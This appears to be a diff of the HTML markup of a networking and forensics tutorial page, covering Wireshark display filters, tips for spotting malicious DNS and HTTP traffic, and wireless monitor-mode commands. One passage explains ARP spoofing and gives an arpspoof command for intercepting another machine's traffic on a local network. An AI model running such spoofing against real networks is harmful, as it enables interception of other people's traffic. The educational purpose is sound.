 &lt;li&gt;Packets that are less than 128 bytes in length:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;128&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;frame.len &amp;lt;= 128
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;TCP packets with SYN flag set:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;syn&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp.flags.syn == 1
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;TCP packets with RST flag set:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rst&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp.flags.rst == 1
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Displays all TCP resets:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reset&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp.flags.reset == 1
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;IP flags where fragment bit is not set (see if someone is trying ping):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;df&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ip.flags.df == 0
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2678,19 +2613,19 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;h2&gt;Some Forensics Tips&lt;/h2&gt;
 &lt;h3&gt;DNS Queries&lt;/h3&gt;
 &lt;p&gt;Look at different DNS queries that are made while the user was online. A possible filter is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;dsn&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;dsn
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This will give a view of any malicious DNS request done without the knowledge of the user. An example is a case where a  visited website has a hidden &lt;strong&gt;iframe&lt;/strong&gt; with some malicious script inside.&lt;/p&gt;
 &lt;h3&gt;HTTP GET Headers&lt;/h3&gt;
 &lt;p&gt;Look for different HTTP streams that have flown during the network activity:  HTML, JavaScript,  image traffic, 302 redirections, non-HTTP streams, Java Archive downloads, etc. A possible filter is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;http
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;You can also look at different GET requests  with:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="n"&gt;contains&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp contains &amp;quot;GET&amp;quot;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2704,7 +2639,7 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;p&gt;When a MAC address is not in the cache list, ARP broadcasts a packet asking which IP address owns some MAC address. The destination machine replies to the packet with its MAC address via an ARP reply (as we have learned above). So,  at this point, the transmitting computer has the data link layer addressing the information it needs to communicate with the remote computer. This information is then stored into the ARP cache.&lt;/p&gt;
 &lt;p&gt;An attacker can spoof this process by  sending ARP messages to an Ethernet switch or router with fake MAC  addresses in order to intercept the traffic of another computer.&lt;/p&gt;
 &lt;p&gt;In Linux, ARP spoofing can be done with &lt;a href="http://www.irongeek.com/i.php?page=security/arpspoof"&gt;arpspoof or Ettercap&lt;/a&gt;. For instance, if  your wlan0 is at 192.168.0.10 and the router is at 192.168.0.1, you can run:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;arpspoof&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="n"&gt;wlan0&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="mf"&gt;192.168.0.10&lt;/span&gt; &lt;span class="mf"&gt;192.168.0.1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;arpspoof -i wlan0 -t 192.168.0.10 192.168.0.1
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2735,18 +2670,18 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;To access the wireless extensions in Linux you can type:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iwconfig&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;iwconfig
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To change the interface (for example eth1) to monitor mode, you type:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iwconfig&lt;/span&gt; &lt;span class="n"&gt;eth1&lt;/span&gt; &lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="n"&gt;monitor&lt;/span&gt;
-&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iwconfig&lt;/span&gt; &lt;span class="n"&gt;eth1&lt;/span&gt; &lt;span class="n"&gt;up&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;iwconfig eth1 mode monitor
+&lt;span class="nv"&gt;$ &lt;/span&gt;iwconfig eth1 up
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To change the channel of the interface:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iwconfig&lt;/span&gt; &lt;span class="n"&gt;eth&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt; &lt;span class="n"&gt;channel&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;iwconfig eth&lt;span class="sb"&gt;`&lt;/span&gt; channel 4
 &lt;/pre&gt;&lt;/div&gt;
 
 
